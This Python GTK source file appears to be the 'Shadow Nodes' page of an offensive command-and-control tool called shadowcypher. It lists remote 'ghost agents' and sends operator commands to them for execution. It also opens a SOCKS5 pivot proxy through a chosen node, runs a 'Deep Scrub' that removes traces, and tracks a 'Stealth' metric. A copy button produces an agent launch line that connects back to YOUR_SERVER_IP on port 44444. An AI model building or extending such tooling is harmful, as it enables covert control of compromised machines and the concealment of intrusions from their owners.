"""Shadow Nodes page — manage remote ghost agents."""

import os

import gi

gi.require_version("Gtk", "3.0")
import time

from gi.repository import Gdk, GLib, Gtk

from shadowcypher.core.bus import bus
from shadowcypher.core.ghost import ghost_orchestrator
from shadowcypher.ui.base_page import BasePage


class ShadowNodesPage(BasePage):
    def __init__(self):
        super().__init__("👻 Shadow Nodes")

        from shadowcypher.ui.components import DataPod
        self.pod_active = DataPod("Connected", "0", "cyan")
        self.pod_signal = DataPod("Stealth", "100%", "green")
        self.pod_fluidity = DataPod("Status", "Ready", "amber")

        for pod in [self.pod_active, self.pod_signal, self.pod_fluidity]:
            self.metric_strip.pack_start(pod, True, True, 0)

        # 2. Node Grid
        frm = Gtk.Frame(label="Active nodes")
        self.node_store = Gtk.ListStore(str, str, str, str, str)
        self.tree = Gtk.TreeView(model=self.node_store)
        self.tree.get_style_context().add_class("node-list")

        for i, t in enumerate(["Operator", "Fingerprint", "Platform", "Host", "Status"]):
            col = Gtk.TreeViewColumn(t, Gtk.CellRendererText(), text=i)
            col.set_resizable(True)
            self.tree.append_column(col)

        sw = Gtk.ScrolledWindow()
        sw.set_min_content_height(250)
        sw.add(self.tree)

        self.workspace.pack_start(frm, True, True, 0)
        frm.add(sw)

        # 3. Tactical Console (Interactive)
        console_frame = Gtk.Frame(label="Console")
        console_box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=5)

        self.console_view = Gtk.TextView()
        self.console_view.set_editable(False)
        self.console_view.set_cursor_visible(False)
        self.console_view.get_style_context().add_class("terminal-view")

        scroll = Gtk.ScrolledWindow()
        scroll.set_policy(Gtk.PolicyType.NEVER, Gtk.PolicyType.AUTOMATIC)
        scroll.set_min_content_height(300)
        scroll.add(self.console_view)
        console_box.pack_start(scroll, True, True, 0)

        # Command Entry
        self.cmd_entry = Gtk.Entry()
        self.cmd_entry.set_placeholder_text("Enter command...")
        self.cmd_entry.connect("activate", self._on_execute)
        console_box.pack_start(self.cmd_entry, False, False, 0)

        console_frame.add(console_box)
        self.workspace.pack_start(console_frame, True, True, 0)

        # \u2500\u2500 Connection Settings \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
        conn_frame = Gtk.Frame(label="NODE LISTENER")
        conn_box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=6)
        conn_box.set_margin_start(10)
        conn_box.set_margin_end(10)
        conn_box.set_margin_top(8)
        conn_box.set_margin_bottom(8)

        bind_row = Gtk.Box(spacing=8)
        bind_row.pack_start(Gtk.Label(label="Bind address:"), False, False, 0)
        self._bind_lbl = Gtk.Label()
        self._bind_lbl.get_style_context().add_class("dim-label")
        bind_row.pack_start(self._bind_lbl, False, False, 0)
        conn_box.pack_start(bind_row, False, False, 0)

        port_row = Gtk.Box(spacing=8)
        port_row.pack_start(Gtk.Label(label="Port:"), False, False, 0)
        self._port_lbl = Gtk.Label()
        self._port_lbl.get_style_context().add_class("dim-label")
        port_row.pack_start(self._port_lbl, False, False, 0)
        conn_box.pack_start(port_row, False, False, 0)

        btn_row2 = Gtk.Box(spacing=8)
        self._ext_btn = Gtk.Button(label="\ud83c\udf10 Enable External Connections")
        self._ext_btn.connect("clicked", self._on_toggle_bind)
        btn_row2.pack_start(self._ext_btn, False, False, 0)

        self._copy_cmd_btn = Gtk.Button(label="\ud83d\udccb Copy Agent Command")
        self._copy_cmd_btn.connect("clicked", self._on_copy_agent_cmd)
        btn_row2.pack_start(self._copy_cmd_btn, False, False, 0)
        conn_box.pack_start(btn_row2, False, False, 0)

        agent_note = Gtk.Label()
        agent_note.set_markup(
            "<span size='x-small' color='#64748b'>"
            "External mode binds 0.0.0.0 \u2014 remote agents can connect over LAN/VPN.\n"
            "Loopback mode is safer for local-only testing."
            "</span>"
        )
        agent_note.set_xalign(0)
        agent_note.set_line_wrap(True)
        conn_box.pack_start(agent_note, False, False, 0)

        conn_frame.add(conn_box)
        self.workspace.pack_start(conn_frame, False, False, 0)
        self._update_bind_display()

        # \u2500\u2500 Control Plane \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
        ctrl_box = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=10)

        exec_btn = Gtk.Button(label="\u26a1 Execute")
        exec_btn.get_style_context().add_class("suggested-action")
        exec_btn.connect("clicked", self._on_execute)
        ctrl_box.pack_start(exec_btn, False, False, 0)

        proxy_btn = Gtk.Button(label="\U0001f510 Start Proxy")
        proxy_btn.get_style_context().add_class("suggested-action")
        proxy_btn.connect("clicked", self._on_start_proxy)
        ctrl_box.pack_start(proxy_btn, False, False, 0)

        scrub_btn = Gtk.Button(label="\U0001f9f9 Deep Scrub")
        scrub_btn.get_style_context().add_class("destructive-action")
        scrub_btn.connect("clicked", self._on_deep_scrub)
        ctrl_box.pack_start(scrub_btn, False, False, 0)

        self.workspace.pack_start(ctrl_box, False, False, 0)

        # Subscribe to bus events
        bus.subscribe("ghost_node_linked", lambda _: GLib.idle_add(self._refresh_grid))
        bus.subscribe("ghost_node_output", self._on_ghost_output)

        self._tick_id = GLib.timeout_add(5000, self._refresh_grid)
        self.connect("unrealize", lambda _: GLib.source_remove(self._tick_id) if self._tick_id else None)
        self._refresh_grid()

    def log(self, msg, level="INFO"):
        buffer = self.console_view.get_buffer()
        iter = buffer.get_end_iter()
        timestamp = time.strftime("%H:%M:%S")
        buffer.insert(iter, f"[{timestamp}] [{level}] {msg}\n")

        # Auto-scroll to bottom
        mark = buffer.get_insert()
        self.console_view.scroll_to_mark(mark, 0.0, True, 0.0, 1.0)

    def _refresh_grid(self):
        if not self.get_mapped():
            return True
        nodes = ghost_orchestrator.get_active_nodes()
        self.node_store.clear()
        for n in nodes:
            status = "Connected" if (time.time() - n["last_seen"] < 60) else "Stale"
            self.node_store.append([
                n["nick"],
                n["fp"][:12],
                n["os"],
                n["host"],
                status
            ])
        self.pod_active.set_value(str(len(nodes)))
        return True

    def _on_execute(self, btn):
        selection = self.tree.get_selection()
        model, treeiter = selection.get_selected()
        if treeiter is None:
            self.log("ERROR: No Shadow Node selected.", "ERROR")
            return

        cmd = self.cmd_entry.get_text().strip()
        if not cmd:
            return

        fp_short = model[treeiter][1]
        # Find full FP
        full_fp = None
        for n in ghost_orchestrator.nodes.values():
            if n.fp.startswith(fp_short):
                full_fp = n.fp
                break

        if full_fp:
            self.log(f"→ '{cmd}' to {model[treeiter][0]}", "INFO")
            ghost_orchestrator.execute(full_fp, cmd)
            self.cmd_entry.set_text("")
        else:
            self.log("ERROR: Node fingerprint mismatch.", "ERROR")

    def _on_start_proxy(self, btn):
        selection = self.tree.get_selection()
        model, treeiter = selection.get_selected()
        if treeiter is None:
            self.log("ERROR: No Shadow Node selected.", "ERROR")
            return

        fp_short = model[treeiter][1]
        # Find full FP
        full_fp = None
        for n in ghost_orchestrator.nodes.values():
            if n.fp.startswith(fp_short):
                full_fp = n.fp
                break

        if full_fp:
            port = 1080
            self.log(f"Starting SOCKS5 proxy on port {port} via {model[treeiter][0]}...", "INFO")
            ghost_orchestrator.start_proxy(full_fp, port)
        else:
            self.log("ERROR: Node fingerprint mismatch.", "ERROR")

    def _on_deep_scrub(self, btn):
        selection = self.tree.get_selection()
        model, treeiter = selection.get_selected()
        if treeiter is None:
            self.log("ERROR: No Shadow Node selected.", "ERROR")
            return

        fp_short = model[treeiter][1]
        # Find full FP
        full_fp = None
        for n in ghost_orchestrator.nodes.values():
            if n.fp.startswith(fp_short):
                full_fp = n.fp
                break

        if full_fp:
            self.log(f"Scrubbing traces on {model[treeiter][0]}...", "INFO")
            ghost_orchestrator.deep_scrub(full_fp)
        else:
            self.log("ERROR: Node fingerprint mismatch.", "ERROR")

    def _on_ghost_output(self, data):
        nick = data.get("nick")
        output = data.get("output")
        GLib.idle_add(self.log, f"[{nick}]\n{output}", "SUCCESS")

    # ── Bind address helpers ──────────────────────────────────────

    def _update_bind_display(self):
        bind = os.environ.get("SHADOWCYPHER_GHOST_BIND", "127.0.0.1")
        port = getattr(ghost_orchestrator, "port", 44444)
        self._bind_lbl.set_text(bind)
        self._port_lbl.set_text(str(port))
        if bind == "0.0.0.0":  # nosec B104
            self._ext_btn.set_label("🔒 Loopback Only (Safer)")
        else:
            self._ext_btn.set_label("🌐 Enable External Connections")

    def _on_toggle_bind(self, _btn):
        current = os.environ.get("SHADOWCYPHER_GHOST_BIND", "127.0.0.1")
        new_bind = "0.0.0.0" if current != "0.0.0.0" else "127.0.0.1"  # nosec B104
        os.environ["SHADOWCYPHER_GHOST_BIND"] = new_bind

        # Restart the orchestrator on the new address
        try:
            ghost_orchestrator.running = False
            if ghost_orchestrator.server_socket:
                try:
                    ghost_orchestrator.server_socket.close()
                except Exception:
                    pass
            ghost_orchestrator._instance = None
            ghost_orchestrator.__class__._instance = None
            ghost_orchestrator.__init__()
            ghost_orchestrator.start()
            self.log(f"Listener restarted on {new_bind}:{getattr(ghost_orchestrator, 'port', 44444)}", "INFO")
        except Exception as e:
            self.log(f"RESTART_ERROR: {e}", "ERROR")

        GLib.idle_add(self._update_bind_display)

    def _on_copy_agent_cmd(self, _btn):
        bind = os.environ.get("SHADOWCYPHER_GHOST_BIND", "127.0.0.1")
        host = bind if bind != "0.0.0.0" else "YOUR_SERVER_IP"  # nosec B104
        port = getattr(ghost_orchestrator, "port", 44444)
        cmd = f"./ghost-agent -host {host} -port {port}"
        clipboard = Gtk.Clipboard.get(Gdk.SELECTION_CLIPBOARD)
        clipboard.set_text(cmd, -1)
        self.log(f"Copied: {cmd}", "INFO")
